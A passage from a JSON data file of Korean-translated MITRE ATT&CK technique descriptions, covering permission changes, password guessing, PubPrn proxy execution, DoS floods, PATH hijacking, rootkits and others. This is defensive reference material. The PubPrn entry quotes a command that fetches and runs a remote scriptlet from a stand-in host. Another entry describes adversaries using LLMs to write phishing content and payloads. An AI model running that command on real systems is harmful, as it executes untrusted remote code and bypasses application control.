    "description": "적대자는 파일 또는 디렉터리의 권한/속성을 수정하여 접근 제어 목록(ACL)을 회피하고 보호된 파일에 접근할 수 있습니다. 파일과 디렉터리 권한은 일반적으로 파일 또는 디렉터리 소유자나 적절한 권한을 가진 사용자가 구성한 ACL에 의해 관리됩니다. 파일과 디렉터리의 ACL 구현은 플랫폼에 따라 다르지만, 일반적으로 어떤 사용자나 그룹이 어떤 작업(읽기, 쓰기, 실행 등)을 수행할 수 있는지를 명시적으로 지정합니다.\n\n대부분의 리눅스 및 리눅스 기반 플랫폼은 각 그룹에 적용되는 사용자, 그룹 및 기타의 표준 권한 그룹과 읽기, 쓰기 및 실행의 표준 권한 집합을 제공합니다. 각 플랫폼의 권한 구현의 뉘앙스는 다를 수 있지만, 대부분의 플랫폼은 파일 및 디렉터리 ACL을 조작하는 데 사용되는 두 가지 주요 명령어, 즉 파일 소유자를 변경하는 `chown`과 권한 모드를 변경하는 `chmod`을 제공합니다.\n\n적대자는 이러한 명령어를 사용하여 자신을 파일 및 디렉터리의 소유자로 만들거나 현재 권한이 허용하는 경우 모드를 변경할 수 있습니다. 이후에 다른 사용자가 파일에 접근하지 못하도록 잠가버릴 수 있습니다. 특정 파일 및 디렉터리 수정은 지속성을 확립하거나 다른 중요 이진/구성 파일을 손상시키거나 탈취하는 등의 많은 기법에 필요한 단계일 수 있습니다.",
    "external_id": "T1222.002",
    "modified": "2023-08-14T17:54:22.970Z",
    "translated": true
  },
  {
    "title": "Password Guessing",
    "description": "시스템이나 환경 내에서 합법적인 자격 증명에 대한 사전 지식이 없는 공격자는 계정에 접근하기 위해 비밀번호를 추측할 수 있습니다. 계정의 비밀번호를 알지 못하는 공격자는 반복적이거나 반복적인 메커니즘을 사용하여 비밀번호를 체계적으로 추측할 수 있습니다. 공격자는 운영 중에 일반적인 비밀번호 목록을 사용하여 시스템이나 환경 비밀번호에 대한 사전 지식 없이 로그인 자격 증명을 추측할 수 있습니다. 비밀번호 추측은 타겟의 비밀번호 복잡성에 대한 정책이나 실패한 시도 후에 계정을 잠글 수 있는 사용 정책을 고려하지 않을 수도 있습니다.\n\n비밀번호를 추측하는 것은 조직의 로그인 실패 정책에 따라 여러 인증 실패 및 계정 잠금을 초래할 수 있기 때문에 위험할 수 있습니다.\n\n일반적으로 비밀번호를 추측할 때는 일반적으로 사용되는 포트의 관리 서비스가 사용됩니다. 일반적으로 목표가 되는 서비스는 다음과 같습니다:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / 터미널 서비스 (3389/TCP)\n* HTTP/HTTP 관리 서비스 (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP 및 162/TCP/UDP)\n\n관리 서비스 외에도 공격자는 \"페더레이션 인증 프로토콜을 이용한 싱글 사인온(SSO) 및 클라우드 기반 애플리케이션\"을 목표로 삼을 수 있으며, 외부에 노출된 이메일 애플리케이션인 Office 365와 같은 애플리케이션도 포함됩니다. 또한 공격자는 `wlanAPI`와 같은 네트워크 장치 인터페이스를 악용하여 무선 인증 프로토콜을 통해 접근 가능한 와이파이 라우터에 대하여 무작위 대입 공격을 시도할 수 있습니다.\n\n기본 환경에서는 LDAP 및 Kerberos 연결 시도가 SMB 이벤트를 생성할 가능성이 낮으며, 이는 Windows \"로그온 실패\" 이벤트 ID 4625를 발생시킵니다.",
    "external_id": "T1110.001",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "PubPrn",
    "description": "적대자는 PubPrn을 사용하여 악성 원격 파일의 실행을 프록시할 수 있습니다. PubPrn.vbs는 Active Directory 도메인 서비스에 프린터를 게시하는 Visual Basic 스크립트입니다. 이 스크립트는 마이크로소프트에 의해 서명되었을 수 있으며, 일반적으로 Windows 명령 셸을 통해 실행됩니다. 예를 들어, 다음 코드는 지정된 도메인 내에 프린터를 게시합니다: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com.\n\n적대자는 PubPrn을 악성 페이로드를 원격 사이트에서 호스팅하여 실행하는 데 악용할 수 있습니다. 이를 위해 적대자는 두 번째 script: 매개변수를 원격 사이트에 호스팅된 스크립틀릿 파일(.sct)을 참조하도록 설정할 수 있습니다. 명령 예시는 pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct입니다. 이 동작은 서명 확인 제한 및 이 스크립트의 남용을 고려하지 않는 애플리케이션 제어 솔루션을 우회할 수 있습니다.\n\nWindows의 최신 버전(10 이상)에서는 PubPrn.vbs가 원격 사이트에서의 프록시 실행을 방지하도록 업데이트되었습니다. 이는 두 번째 매개변수에서 지정된 프로토콜을 LDAP://로 제한하여, HTTP(S)를 통해 원격 코드를 참조하는 데 사용될 수 있는 script: 문구를 사용할 수 없도록 함으로써 이루어졌습니다.",
    "external_id": "T1216.001",
    "modified": "2022-04-18T14:55:35.817Z",
    "translated": true
  },
  {
    "title": "Purchase Technical Data",
    "description": "적대자들은 목표를 설정하는 데 사용할 수 있는 피해자에 대한 기술 정보를 구매할 수 있습니다. 피해자에 대한 정보는 유료 구독 서비스를 통해 제공되는 스캔 데이터베이스 또는 기타 데이터 집계 서비스와 같은 신뢰할 수 있는 개인 소스 및 데이터베이스에서 구매할 수 있을 수 있습니다. 또한 적대자들은 다크웹이나 사이버 범죄 블랙마켓과 같은 덜 신뢰할 수 있는 출처에서도 정보를 구매할 수 있습니다.\n\n적대자들은 이미 식별된 대상에 대한 정보를 구매하거나 구매한 데이터를 사용하여 성공적인 침입 기회를 발견할 수 있습니다. 위협 행위자는 구매한 데이터에서 다양한 기술 세부사항을 수집할 수 있으며, 여기에는 직원 연락처 정보, 자격 증명 또는 피해자의 인프라에 대한 세부정보가 포함되지만 이에 국한되지는 않습니다. 이러한 출처의 정보는 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 설정하거나 초기 접근을 가능하게 할 수 있습니다.",
    "external_id": "T1597.002",
    "modified": "2021-04-15T03:44:43.900Z",
    "translated": true
  },
  {
    "title": "OS Credential Dumping",
    "description": "적대자는 계정 로그인 및 자격 증명 자료를 얻기 위해 자격 증명을 덤프하려고 할 수 있으며, 이는 일반적으로 해시나 평문 비밀번호 형태로 존재합니다. 자격 증명은 운영 체제 캐시, 메모리 또는 구조물에서 얻을 수 있습니다. 그런 다음 자격 증명은 수평 이동을 수행하고 제한된 정보에 접근하는 데 사용될 수 있습니다.\n\n연관된 하위 기술에서 언급된 도구는 적대자와 전문 보안 테스터 모두가 사용할 수 있습니다. 추가적인 맞춤형 도구도 존재할 가능성이 있습니다.",
    "external_id": "T1003",
    "modified": "2024-10-15T15:12:43.034Z",
    "translated": true
  },
  {
    "title": "Shared Modules",
    "description": "적대자는 공유 모듈을 로드하여 악성 페이로드를 실행할 수 있습니다. 공유 모듈은 특정 맞춤 함수나 OS API 기능 호출과 같은 재사용 가능한 코드에 접근하기 위해 프로세스에 로드되는 실행 파일입니다.\n\n적대자는 이 기능을 사용하여 피해 시스템에서 임의의 페이로드를 실행할 수 있습니다. 예를 들어, 적대자는 자신의 악성코드 기능을 공유 객체로 모듈화하여 C2 네트워크 통신을 관리하거나 목표에 대한 특정 작업을 실행하는 등의 다양한 기능을 수행할 수 있습니다.\n\nLinux 및 macOS 모듈 로더는 임의의 로컬 경로에서 공유 객체를 로드하고 실행할 수 있습니다. 이 기능은 `dlfcn.h`에 존재하며 `dlopen` 및 `dlsym`과 같은 함수에 포함되어 있습니다. macOS는 `.so` 파일을 실행할 수 있지만, 일반적인 관행은 `.dylib` 파일을 사용합니다.\n\nWindows 모듈 로더는 임의의 로컬 경로 및 임의의 UNC 네트워크 경로에서 DLL을 로드하도록 지시할 수 있습니다. 이 기능은 `NTDLL.dll`에 존재하며, 런타임에서 `LoadLibrary`와 같은 함수로 호출되는 Windows Native API의 일부입니다.",
    "external_id": "T1129",
    "modified": "2023-10-12T21:17:14.868Z",
    "translated": true
  },
  {
    "title": "Data from Configuration Repository",
    "description": "적대자는 구성 저장소에서 관리 장치와 관련된 데이터를 수집할 수 있습니다. 구성 저장소는 원격 시스템의 데이터를 구성하고 관리하며 제어하기 위한 관리 시스템에서 사용됩니다. 구성 저장소는 장치의 원격 접근 및 관리를 촉진할 수도 있습니다.\n\n적대자는 이러한 저장소를 목표로 하여 대량의 민감한 시스템 관리 데이터를 수집할 수 있습니다. 구성 저장소의 데이터는 다양한 프로토콜과 소프트웨어에 의해 노출될 수 있으며, 저장되는 데이터는 매우 다양하며 적대자의 탐색 목표와 일치할 수 있는 데이터가 많습니다.",
    "external_id": "T1602",
    "modified": "2022-04-19T21:32:58.274Z",
    "translated": true
  },
  {
    "title": "Disk Structure Wipe",
    "description": "적대자는 시스템 부팅에 필요한 하드 드라이브의 디스크 데이터 구조를 손상시키거나 삭제할 수 있습니다. 이는 특정 중요한 시스템을 목표로 하거나 네트워크에서 대규모로 발생하여 시스템 및 네트워크 리소스의 가용성을 중단할 수 있습니다.\n\n적대자는 마스터 부트 레코드(MBR)나 파티션 테이블과 같은 구조에 있는 중요한 데이터를 덮어써서 시스템이 부팅할 수 없도록 시도할 수 있습니다. 디스크 구조에 포함된 데이터는 운영 체제를 로딩하기 위한 초기 실행 코드 또는 디스크에서 파일 시스템 파티션의 위치가 포함될 수 있습니다. 이 정보가 없으면 컴퓨터는 부팅 과정 중에 운영 체제를 로딩할 수 없어 컴퓨터가 사용 불가능하게 됩니다. 디스크 구조 삭제는 독립적으로 수행될 수 있으며, 디스크의 모든 섹터가 삭제되는 경우에는 디스크 내용 삭제와 함께 수행될 수 있습니다.\n\n네트워크 장치의 경우, 적대자는 `format`과 같은 네트워크 장치 CLI 명령어를 사용하여 파일 시스템을 포맷할 수 있습니다.\n\n대상 조직에 대한 영향을 극대화하기 위해 디스크 구조를 파괴하기 위해 설계된 악성 코드는 네트워크를 통해 퍼지기 위해 웜과 같은 기능을 가질 수 있으며, 이를 위해 유효한 계정, 운영 체제 자격 증명 덤핑, SMB/Windows 관리 공유와 같은 다른 기술을 활용할 수 있습니다.",
    "external_id": "T1561.002",
    "modified": "2024-10-15T16:32:05.064Z",
    "translated": true
  },
  {
    "title": "Direct Network Flood",
    "description": "적대자는 목표 시스템에 높은 양의 네트워크 트래픽을 직접 전송하여 서비스 거부(DoS)를 유발할 수 있습니다. 이러한 DoS 공격은 목표 시스템과 네트워크의 가용성과 기능성을 저하시킬 수 있습니다. 직접 네트워크 홍수 공격은 하나 이상의 시스템이 목표 서비스의 네트워크로 높은 양의 네트워크 패킷을 전송하는 경우를 말합니다. 거의 모든 네트워크 프로토콜이 홍수 공격에 사용될 수 있습니다. UDP나 ICMP와 같은 무상태 프로토콜이 일반적으로 사용되지만, TCP와 같은 유상태 프로토콜도 사용할 수 있습니다.\n\n봇넷은 네트워크와 서비스에 대한 네트워크 홍수 공격을 수행하는 데 일반적으로 사용됩니다. 대규모 봇넷은 전 세계 인터넷에 분산된 시스템에서 상당한 양의 트래픽을 생성할 수 있습니다. 적대자는 자신의 봇넷 인프라를 구축하고 제어할 자원이 있을 수 있으며 또는 기존의 봇넷을 임대하여 공격을 수행할 수 있습니다. 분산 서비스 거부(DDoS) 공격의 최악의 경우에는, 너무 많은 시스템이 홍수를 발생시키기 위해 사용되어 각 시스템이 목표 네트워크를 포화시키기 위해 소량의 트래픽만 보내면 충분한 경우도 발생합니다. 이러한 경우에는 DDoS 트래픽과 합법적인 클라이언트를 구별하기가 매우 어려워집니다. 봇넷은 2012년 주요 미국 은행을 대상으로 한 일련의 사건과 같은 가장 고프로파일 DDoS 홍수 공격에서 사용되었습니다.",
    "external_id": "T1498.001",
    "modified": "2024-10-15T15:54:49.943Z",
    "translated": true
  },
  {
    "title": "Path Interception by PATH Environment Variable",
    "description": "적대자는 라이브러리를 로드하는 데 사용되는 환경 변수를 하이재킹하여 자신의 악성 페이로드를 실행할 수 있습니다. PATH 환경 변수는 운영 체제가 스크립트나 명령줄에서 호출된 바이너리를 찾기 위해 순차적으로 검색하는 디렉토리 목록(사용자와 시스템)을 포함하고 있습니다.\n\n적대자는 PATH 환경 변수에 저장된 디렉토리 목록의 이전 항목에 악성 프로그램을 배치하여 운영 체제가 해당 PATH 목록을 순차적으로 검색할 때 합법적인 바이너리 대신 악성 바이너리를 실행하게 만들 수 있습니다.\n\n예를 들어, Windows에서 적대자가 \"net.exe\"라는 이름의 악성 프로그램을 `C:\\example path`에 배치하면, 이 경로가 기본적으로 `C:\\Windows\\system32\\net.exe` 앞에 오게 되어, 명령줄에서 \"net\"이 실행될 때 시스템의 합법적인 실행파일인 `C:\\Windows\\system32\\net.exe` 대신 `C:\\example path`가 호출됩니다. 프로그램의 경로가 제공되지 않을 때 검색할 위치를 결정하는 데 PATH 환경 변수를 사용하는 프로그램 실행 방법들이 있습니다.\n\n적대자는 또한 직접적으로 검색할 디렉토리를 지정하는 $PATH 변수를 수정할 수 있습니다. 적대자는 `$PATH` 변수를 작성 권한이 있는 디렉토리를 가리키도록 수정할 수 있습니다. $PATH 변수를 사용하는 프로그램이 호출될 때, 운영 체제는 지정된 디렉토리를 검색하고 악성 바이너리를 실행합니다. macOS에서는 $HOME 변수를 수정하여 이 작업을 수행할 수도 있습니다. 이러한 변수들은 명령줄, launchctl, 또는 `/etc/paths.d` 폴더 내용을 수정하여 변경할 수 있습니다.",
    "external_id": "T1574.007",
    "modified": "2023-10-03T03:29:57.078Z",
    "translated": true
  },
  {
    "title": "Sharepoint",
    "description": "적대자들은 SharePoint 저장소를 가치 있는 정보를 채굴하는 원천으로 활용할 수 있습니다. SharePoint에는 내부 네트워크 및 시스템의 구조와 기능에 대해 적대자가 알 수 있도록 유용한 정보가 포함되어 있는 경우가 많습니다. 다음은 적대자에게 잠재적 가치를 가질 수 있으며 SharePoint에서 발견될 수 있는 정보 목록입니다:\n\n* 정책, 절차 및 기준\n* 물리적/논리적 네트워크 다이어그램\n* 시스템 아키텍처 다이어그램\n* 기술 시스템 문서\n* 테스트/개발 자격 증명\n* 작업/프로젝트 일정\n* 소스 코드 조각\n* 네트워크 공유 및 기타 내부 리소스에 대한 링크",
    "external_id": "T1213.002",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Direct Volume Access",
    "description": "적대자는 파일 접근 제어 및 파일 시스템 모니터링을 우회하기 위해 볼륨에 직접 접근할 수 있습니다. 윈도우는 프로그램이 논리 볼륨에 직접 접근할 수 있도록 허용합니다. 직접 접근하는 프로그램은 파일 시스템 데이터 구조를 분석하여 드라이브에서 직접 파일을 읽고 쓸 수 있습니다. 이 기술은 윈도우 파일 접근 제어 및 파일 시스템 모니터링 도구를 우회할 수 있습니다.\n\n파워쉘에서 이러한 작업을 수행하기 위해 `NinjaCopy`와 같은 유틸리티가 존재합니다. 적대자는 또한 `vssadmin`, `wbadmin`과 같은 기본 제공 또는 서드파티 유틸리티를 사용하여 시스템 볼륨에서 데이터의 섀도 복사본이나 백업을 생성할 수 있습니다.",
    "external_id": "T1006",
    "modified": "2024-04-16T12:25:24.480Z",
    "translated": true
  },
  {
    "title": "Artificial Intelligence",
    "description": "적대자는 목표 설정 중 다양한 기술을 지원하기 위해 대형 언어 모델(LLM)과 같은 생성적 인공지능 도구에 접근할 수 있습니다. 이러한 도구는 정찰 수행, 기본 스크립트 작성, 사회 공학 지원, 심지어 페이로드 개발 등 다양한 악의적인 작업을 수행하는 데 사용될 수 있습니다.\n\n예를 들어, 공개적으로 이용 가능한 LLM을 활용함으로써 적대자는 본질적으로 특정 작업을 도구에 아웃소싱하거나 자동화하고 있습니다. AI를 사용하여 적대자는 피싱 캠페인에 사용될 수 있는 다양한 언어로 콘텐츠를 작성하고 생성할 수 있습니다. 동일한 공개 도구는 또한 능력 개발을 지원하는 취약성 또는 기타 공격적 연구를 가능하게 할 수 있습니다. AI 도구는 또한 악성 스크립트와 페이로드를 생성, 정제하거나 다른 방식으로 향상시켜 기술적 작업을 자동화할 수 있습니다.",
    "external_id": "T1588.007",
    "modified": "2024-09-12T19:18:36.583Z",
    "translated": true
  },
  {
    "title": "Email Hiding Rules",
    "description": "적대자는 침해된 사용자의 메일박스에서 수신 이메일을 숨기기 위해 이메일 규칙을 사용할 수 있습니다. 많은 이메일 클라이언트는 사용자가 이메일을 다른 폴더로 이동하거나, 읽음으로 표시하거나, 삭제하는 등 다양한 이메일 기능에 대한 수신함 규칙을 생성할 수 있도록 허용합니다. 규칙은 이메일 클라이언트 내에서 생성되거나 수정될 수 있으며, Windows 시스템의 외부 기능을 통해 이루어질 수도 있습니다.\n\n적대자는 침해된 사용자의 메일박스 내에서 이메일 규칙을 활용하여 이메일을 삭제하거나 덜 눈에 띄는 폴더로 이동할 수 있습니다. 적대자는 이를 통해 보안 경고, C2 통신 또는 침해된 계정에서 전송된 내부 피싱 이메일에 대한 응답을 숨길 수 있습니다.\n\n조직 내의 모든 사용자나 관리자는 (유효한 자격 증명을 가진 적대자도 포함하여) 이메일을 자동으로 이동하거나 삭제하는 규칙을 생성할 수 있습니다. 이러한 규칙은 이메일 내용이 즉시 사용자가나 방어자에게 보여졌다면 탐지를 방해하거나 지연시키는 데 악용될 수 있습니다. 악의적인 규칙은 일반적으로 메시지 본문과 제목에서 발견되는 주요 단어(예: 맬웨어, 의심스러운, 피싱, 해킹)를 기준으로 이메일을 필터링합니다.\n\n일부 환경에서는 관리자가 개별 수신함이 아닌 조직 전반에서 작동하는 이메일 규칙을 활성화할 수 있습니다. 예를 들어, Microsoft Exchange는 조직이 수신하는 모든 메일을 사용자 지정 조건에 따라 평가하고, 해당 조건을 준수하는 메일에 대해 사용자 지정 작업을 수행하는 전송 규칙을 지원합니다. 이러한 기능을 악용하는 적대자는 특정 주제(예: 내부 보안 사고 알림)와 관련된 모든 이메일을 자동으로 수정하거나 삭제할 수 있습니다.",
    "external_id": "T1564.008",
    "modified": "2024-10-15T15:56:27.592Z",
    "translated": true
  },
  {
    "title": "External Defacement",
    "description": "적대자가 조직 외부의 시스템을 훼손하여 메시지를 전달하거나 위협하거나 조직이나 사용자에게 오도하려 할 수 있습니다. 외부 훼손은 궁극적으로 사용자가 시스템을 신뢰하지 않게 하고 시스템의 무결성에 의문을 제기하거나 신뢰성을 훼손하게 만들 수 있습니다. 외부에 노출된 웹사이트는 훼손의 일반적인 희생자이며, 종종 정치적 메시지를 전달하거나 선전을 퍼뜨리기 위해 적대자와 해킹 활동 단체의 표적이 됩니다. 외부 훼손은 사건을 촉발하는 촉매 역할을 하거나 조직이나 정부의 조치에 대한 반응으로 사용될 수 있습니다. 비슷하게, 웹사이트 훼손은 미래 공격을 위한 준비나 전조로도 사용될 수 있습니다.",
    "external_id": "T1491.002",
    "modified": "2022-03-25T19:34:37.539Z",
    "translated": true
  },
  {
    "title": "Encrypted/Encoded File",
    "description": "적대자는 문자열, 바이트 및 기타 특정 패턴을 숨기기 위해 파일을 암호화하거나 인코딩할 수 있으며, 이를 통해 탐지를 방해하려고 합니다. 파일 내용을 암호화하거나 인코딩하는 목적은 침입 시 사용되는 파일 내의 악성 아티팩트를 숨기는 것입니다. 소프트웨어 패킹, 스테가노그래피, 임베디드 페이로드와 같은 많은 다른 기법들도 같은 넓은 목표를 공유합니다. 파일을 암호화하거나 인코딩하면 정적 서명의 탐지에 공백이 발생할 수 있으며, 악성 내용은 실행 또는 사용 시에 드러날 수 있습니다.\n\n이러한 파일 난독화는 희생자의 호스트에서 존재하는 많은 파일 아티팩트, 예를 들어 악성코드 로그/구성 및 페이로드 파일에 적용될 수 있습니다. 파일은 하드코딩된 키 혹은 사용자가 제공한 키로 암호화할 수 있으며, Base64와 같은 표준 인코딩/압축 방식을 사용하여 난독화할 수 있습니다.\n\n파일의 전체 내용이 난독화될 수 있으며, 특정 기능이나 값(예: C2 주소)만 난독화될 수도 있습니다. 추가적인 보호를 위해 중복된 계층으로 암호화 및 인코딩이 적용될 수도 있습니다.\n\n예를 들어, 적대자는 비밀번호로 보호된 Word 문서나 자기 추출(SFX) 아카이브를 악성 페이로드와 같은 파일을 암호화/인코딩하는 방법으로 악용할 수 있습니다. 이러한 파일은 일반적으로 의도된 압축 내용을 파일이 호출될 때 실행되는 압축 해제기 스텁에 첨부하는 방식으로 작동합니다.\n\n적대자는 파일별 및 사용자 정의 인코딩 방식도 악용할 수 있습니다. 예를 들어, 텍스트 파일의 바이트 순서 마크(BOM) 헤더는 파일 내용을 조작하고 난독화하는 데 악용될 수 있으며, 이는 명령 및 스크립팅 인터프리터 실행 시까지 지속될 수 있습니다.",
    "external_id": "T1027.013",
    "modified": "2024-10-15T16:32:45.108Z",
    "translated": true
  },
  {
    "title": "IP Addresses",
    "description": "적대자는 표적을 설정하는 데 사용할 수 있는 피해자의 IP 주소를 수집할 수 있습니다. 공인 IP 주소는 블록 단위로 또는 연속된 주소 범위로 조직에 할당될 수 있습니다. 할당된 IP 주소에 대한 정보에는 어떤 IP 주소가 사용 중인지와 같은 다양한 세부사항이 포함될 수 있습니다. IP 주소는 또한 적대자가 피해자에 대한 다른 정보를 추론하는 데 도움이 될 수 있으며, 여기에는 조직의 크기, 물리적 위치, 인터넷 서비스 제공업체, 그리고 공개적으로 접근 가능한 인프라가 어떻게 호스팅되고 있는지가 포함됩니다.\n\n적대자는 이러한 정보를 다양한 방법으로 수집할 수 있으며, 예를 들어 직접 수집 활동을 통해 이루어질 수 있습니다. 할당된 IP 주소에 대한 정보는 온라인이나 기타 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수도 있습니다. 이러한 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 구축하거나 초기 접근을 Establish하는 데 도움이 될 수 있습니다.",
    "external_id": "T1590.005",
    "modified": "2021-04-15T03:31:05.302Z",
    "translated": true
  },
  {
    "title": "OS Exhaustion Flood",
    "description": "공격자는 엔드포인트의 운영 체제(OS)를 목표로 하는 서비스 거부(DoS) 공격을 시작할 수 있습니다. 시스템의 운영 체제는 유한한 리소스를 관리하고 과도한 용량 요구로 인해 전체 시스템이 압도되지 않도록 하는 역할을 합니다. 이러한 공격은 시스템의 실제 리소스를 고갈시키지 않더라도, 운영 체제가 스스로 부과하는 한계와 가용 리소스를 고갈시킬 수 있습니다.\n\n이를 달성하는 다양한 방법이 존재하며, TCP 상태 고갈 공격인 SYN 플러드와 ACK 플러드가 포함됩니다. SYN 플러드에서는 과도한 양의 SYN 패킷이 전송되지만, 3-way TCP 핸드셰이크가 완료되지 않습니다. 각 OS는 허용할 수 있는 동시 TCP 연결의 최대 수를 가지고 있기 때문에, 이는 시스템이 새로운 TCP 연결 요청을 수신할 수 있는 능력을 빠르게 고갈시켜, 서버가 제공하는 어떤 TCP 서비스에도 접근하지 못하게 할 수 있습니다.\n\nACK 플러드는 TCP 프로토콜의 상태 유지 특성을 활용합니다. 목표 대상으로 ACK 패킷이 대량으로 전송됩니다. 이는 OS가 이미 설정된 관련 TCP 연결을 찾기 위해 상태 테이블을 검색하도록 강제합니다. ACK 패킷이 존재하지 않는 연결에 대한 것이기 때문에 OS는 일치하는 연결이 없음을 확인하기 위해 전체 상태 테이블을 검색해야 합니다. 이 작업을 대량의 패킷에 대해 수행해야 할 경우, 계산 요구 사항이 서버를 둔화시키거나 응답하지 않게 만들 수 있으며, 이는 악성 ACK 패킷을 제거하기 위해 수행해야 하는 작업 때문입니다. 이는 목표 서비스 제공을 위한 가용 리소스를 크게 감소시킵니다.",
    "external_id": "T1499.001",
    "modified": "2023-03-30T21:01:51.289Z",
    "translated": true
  },
  {
    "title": "Rootkit",
    "description": "적대자는 루트킷을 사용하여 프로그램, 파일, 네트워크 연결, 서비스, 드라이버 및 기타 시스템 구성 요소의 존재를 숨길 수 있습니다. 루트킷은 시스템 정보를 제공하는 운영 체제 API 호출을 가로채거나 수정하여 악성 소프트웨어의 존재를 숨기는 프로그램입니다.\n\n루트킷 또는 루트킷 기능은 운영 체제의 사용자 또는 커널 수준에 존재할 수 있으며, 하이퍼바이저, 마스터 부트 레코드 또는 시스템 펌웨어를 포함한 더 낮은 수준에도 존재할 수 있습니다. 루트킷은 Windows, Linux 및 Mac OS X 시스템에서 발견되었습니다.",
    "external_id": "T1014",
    "modified": "2023-03-30T21:01:50.568Z",
    "translated": true
  },
  {
    "title": "PowerShell Profile",
    "description": "적의는 PowerShell 프로필에 의해 트리거된 악성 콘텐츠를 실행함으로써 지속성을 확보하고 권한을 상승시킬 수 있습니다. PowerShell 프로필은 PowerShell이 시작될 때 실행되는 스크립트로, 사용자 환경을 사용자화하기 위한 로그온 스크립트로 사용될 수 있습니다.\n\nPowerShell은 사용자나 호스트 프로그램에 따라 여러 프로필을 지원합니다. 예를 들어, PowerShell 콘솔, PowerShell ISE 또는 Visual Studio Code와 같은 PowerShell 호스트 프로그램별로 다양한 프로필이 있을 수 있습니다. 관리자는 또한 로컬 컴퓨터의 모든 사용자와 호스트 프로그램에 적용되는 프로필을 구성할 수 있습니다.\n\n적의는 이러한 프로필을 수정하여 임의의 명령, 함수, 모듈 및/또는 PowerShell 드라이브를 포함시켜 지속성을 확보할 수 있습니다. 사용자가 PowerShell 세션을 열 때마다 수정된 스크립트가 실행되며, 이를 실행할 때 <code>-NoProfile</code> 플래그가 사용되지 않는 한 계속 실행됩니다.\n\n또한, 적은 PowerShell 프로필의 스크립트가 더 높은 권한을 가진 계정, 예를 들어 도메인 관리자가 로드하고 실행할 경우 권한을 상승시킬 수 있습니다.",
    "external_id": "T1546.013",
    "modified": "2023-10-20T17:04:13.976Z",
    "translated": true
  },
  {
    "title": "JavaScript",
    "description": "적대자는 실행을 위해 JavaScript의 다양한 구현을 악용할 수 있습니다. JavaScript (JS)는 플랫폼에 독립적인 스크립트 언어로, 웹페이지의 스크립트와 일반적으로 연결되어 있으며, 브라우저 외부의 실행 환경에서도 실행될 수 있습니다.\n\nJScript는 동일한 스크립팅 표준의 Microsoft 구현입니다. JScript는 Windows Script 엔진을 통해 해석되며, 따라서 [컴포넌트 개체 모델]과 Internet Explorer HTML 응용 프로그램 (HTA) 페이지와 같은 Windows의 많은 구성 요소와 통합됩니다.\n\nJavaScript for Automation (JXA)는 macOS 스크립팅 언어로, JavaScript를 기반으로 하며, Apple의 Open Scripting Architecture (OSA)의 일부로 포함되어 있으며, OSX 10.10에서 도입되었습니다. Apple의 OSA는 응용 프로그램을 제어하고, 운영체제와 상호작용하며, Apple의 내부 API에 접근하는 기능을 제공합니다. OSX 10.10부터 OSA는 JXA와 [AppleScript]의 두 가지 언어만 지원합니다. 스크립트는 명령줄 유틸리티 <code>osascript</code>를 통해 실행할 수 있으며, <code>osacompile</code>를 사용하여 응용 프로그램 또는 스크립트 파일로 컴파일할 수 있고, OSAKit 프레임워크를 활용하여 다른 프로그램의 메모리에서 컴파일하고 실행할 수 있습니다.\n\n적대자는 다양한 행동을 실행하기 위해 JavaScript의 다양한 구현을 악용할 수 있습니다. 일반적인 용도는 [드라이브 바이 컴프라미스]의 일환으로 웹사이트에 악성 스크립트를 호스팅하거나 이러한 스크립트 파일을 다운로드 및 실행하는 것입니다. 이러한 페이로드가 텍스트 기반이기 때문에, 적대자가 [난독화된 파일 또는 정보]의 일환으로 내용을 난독화하는 것도 매우 일반적입니다.",
    "external_id": "T1059.007",
    "modified": "2024-07-30T14:12:52.698Z",
    "translated": true
  },
  {
    "title": "Audio Capture",
    "description": "적대자는 컴퓨터의 주변 장치(예: 마이크 및 웹캠)나 애플리케이션(예: 음성 및 영상 통화 서비스)을 활용하여 민감한 대화를 엿듣기 위해 오디오 녹음을 캡처할 수 있습니다.\n\n악성 코드나 스크립트는 운영 체제나 애플리케이션이 제공하는 API를 통해 장치와 상호작용하여 오디오를 캡처하는 데 사용될 수 있습니다. 오디오 파일은 디스크에 저장된 후 나중에 유출될 수 있습니다.",
    "external_id": "T1123",
    "modified": "2024-10-15T13:39:22.774Z",
    "translated": true
  },
  {
    "title": "Create or Modify System Process",
    "description": "적대자는 지속성을 유지하기 위해 악의적인 페이로드를 반복적으로 실행하는 시스템 수준 프로세스를 생성하거나 수정할 수 있습니다. 운영 체제가 부팅될 때, 백그라운드 시스템 기능을 수행하는 프로세스를 시작할 수 있습니다. Windows와 Linux에서는 이러한 시스템 프로세스를 서비스라고 합니다. macOS에서는 시스템 초기화를 완료하고 사용자 특화 매개 변수를 로드하기 위해 launchd 프로세스인 Launch Daemon 및 Launch Agent가 실행됩니다.\n\n적대자는 새 서비스, 데몬 또는 에이전트를 설치하여 부팅 시 또는 반복 가능한 간격으로 실행하도록 구성할 수 있어 지속성을 확립할 수 있습니다. 마찬가지로, 적대자는 동일한 효과를 얻기 위해 기존 서비스, 데몬 또는 에이전트를 수정할 수 있습니다.\n\n서비스, 데몬 또는 에이전트는 관리 권한으로 생성되지만 root/SYSTEM 권한으로 실행될 수 있습니다. 적대자는 이 기능을 활용하여 시스템 프로세스를 생성하거나 수정하여 권한을 상승시킬 수 있습니다.",
    "external_id": "T1543",
    "modified": "2024-02-15T14:14:03.942Z",
    "translated": true
  },
  {
    "title": "External Remote Services",
